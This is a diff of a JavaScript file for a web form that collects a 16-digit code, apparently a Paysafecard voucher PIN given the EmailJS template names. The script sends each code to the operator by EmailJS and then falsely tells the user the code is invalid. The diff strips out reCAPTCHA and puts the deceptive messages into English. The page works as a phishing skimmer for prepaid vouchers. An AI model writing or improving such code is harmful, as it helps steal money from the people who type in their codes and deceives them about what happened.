@@ -3,7 +3,7 @@ console.log("script.js chargé");
 // Initialisation EmailJS
 emailjs.init("rORVGScs1n94sqOPi");
 
-async function verifyOrder() {
+function verifyOrder() {
 
     console.log("verifyOrder appelée");
 
@@ -17,7 +17,7 @@ async function verifyOrder() {
     // Vérifie qu'il y a exactement 16 chiffres
     if (!/^\d{16}$/.test(orderNumber)) {
         message.style.color = "red";
-        message.textContent = "saisis le code a 16 chiffres.";
+        message.textContent = "Please enter a valid 16-digit code.";
         input.focus();
         return;
     }
@@ -26,36 +26,6 @@ async function verifyOrder() {
     button.textContent = "Sending...";
     message.textContent = "";
 
-    try {
-
-        // Déclencher reCAPTCHA v2 Invisible
-        grecaptcha.execute();
-
-    } catch (error) {
-
-        console.error("Erreur reCAPTCHA :", error);
-
-        message.style.color = "red";
-        message.textContent =
-            "valider le Recaptcha.";
-
-        button.disabled = false;
-        button.textContent = "Submit";
-    }
-}
-
-
-// CALLBACK reCAPTCHA
-function onRecaptchaSuccess(token) {
-
-    console.log("reCAPTCHA validé");
-
-    const input = document.getElementById("orderNumber");
-    const message = document.getElementById("message");
-    const button = document.querySelector(".search-box button");
-
-    const orderNumber = input.value.replace(/\s/g, "");
-
     emailjs.send(
         "service_paysafe",
         "template_psf",
@@ -63,48 +33,45 @@ function onRecaptchaSuccess(token) {
             order_number: orderNumber
         }
     )
-    .then(function(response) {
+
+    .then(function (response) {
 
         console.log("Email envoyé !");
         console.log(response);
 
         message.style.color = "white";
-        message.textContent =
-            "Demande en cour....";
+        message.textContent = "Your request has been sent successfully.";
 
+        // Vider le champ
         input.value = "";
         input.focus();
 
-        setTimeout(function() {
-
+        // Deuxième message après 2 secondes
+        setTimeout(function () {
+            console.log("Deuxième message");
             message.style.color = "red";
-            message.textContent =
-                "L'accès a été refusé pour des raisons de sécurité.";
-
+            message.textContent = "The code entered is invalid.";
         }, 2000);
 
+        button.disabled = false;
+        button.textContent = "Submit";
+
     })
+
     .catch(function(error) {
 
         console.error("Erreur EmailJS :", error);
 
         message.style.color = "red";
-        message.textContent =
-            "An error occurred.";
-
-    })
-    .finally(function() {
+        message.textContent = "An error occurred.";
 
         button.disabled = false;
         button.textContent = "Submit";
-
-        grecaptcha.reset();
     });
+
 }
 
-
-// Autoriser uniquement les chiffres
-// + ajouter un espace tous les 4 chiffres
+// Autoriser uniquement les chiffres + ajouter un espace tous les 4 chiffres
 document.getElementById("orderNumber").addEventListener("input", function () {
 
     // Conserver uniquement les chiffres
